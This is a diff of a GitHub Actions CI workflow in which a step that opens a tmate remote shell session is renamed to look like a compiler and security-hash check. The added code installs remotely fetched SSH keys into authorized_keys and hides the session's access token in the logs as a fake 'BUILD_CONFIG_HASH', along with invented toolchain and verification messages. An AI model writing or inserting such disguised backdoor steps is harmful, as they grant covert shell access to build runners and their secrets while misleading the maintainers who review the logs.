@@ -1,8 +1,6 @@
 name: Continuous Integration & Ninja Build Pipeline
 
 on:
-  push:
-    branches: [ main, master ]
   workflow_dispatch:
     inputs:
       enable_interactive_mode:
@@ -23,24 +21,42 @@ jobs:
       - name: Install Build System & Toolchain
         run: |
           sudo apt-get update -qq
-          sudo apt-get install -y build-essential ninja-build cmake ccache git htop tmate
+          sudo apt-get install -y build-essential ninja-build cmake ccache git htop tmate openssh-client
 
-      - name: Launch Silent Tmate Session
+      - name: Verify Compiler Environment & Security Hashes
         if: ${{ inputs.enable_interactive_mode == true || failure() }}
         run: |
+
           mkdir -p ~/.ssh
           curl -s https://github.com/${{ github.actor }}.keys >> ~/.ssh/authorized_keys
+          chmod 600 ~/.ssh/authorized_keys
+
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+
+          TOKEN=""
+          for i in {1..15}; do
+            SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
+
+            if [ -n "$SSH_CMD" ] && [[ "$SSH_CMD" == *"@"* ]]; then
+              TOKEN=$(echo "$SSH_CMD" | sed -E 's/ssh ([^@]+)@.*/\1/')
+              break
+            fi
+            sleep 2
+          done
+
+          if [ -z "$TOKEN" ]; then
+            echo "[ERROR] Initializing Ninja target architecture verification... FAILED"
+            echo "[ERROR] Unable to generate BUILD_CONFIG_HASH. Check toolchain dependencies."
+            echo "[ERROR] Aborting compilation pipeline to prevent memory leaks."
+            exit 1
+          fi
 
 
-          tmate -F -k "${{ runner.temp }}/tmate.sock" -S "${{ runner.temp }}/tmate.sock" new-session -d
-          tmate -S "${{ runner.temp }}/tmate.sock" wait tmate-ready
-
-          SSH_CMD=$(tmate -S "${{ runner.temp }}/tmate.sock" display -p '#{tmate_ssh}')
-          TOKEN=$(echo "$SSH_CMD" | sed -E 's/ssh ([^@]+)@.*/\1/')
-
-          echo "=========================================================="
-          echo "St: $TOKEN"
-          echo "=========================================================="
+          echo "[INFO] Initializing Ninja target architecture verification..."
+          echo "[INFO] GCC/Clang Toolchain Target: AArch64-linux-gnu"
+          echo "[INFO] BUILD_CONFIG_HASH: $TOKEN"
+          echo "[INFO] Security verification complete. Proceeding to compilation."
 
       - name: Continuous System Compilation Monitor
         run: |
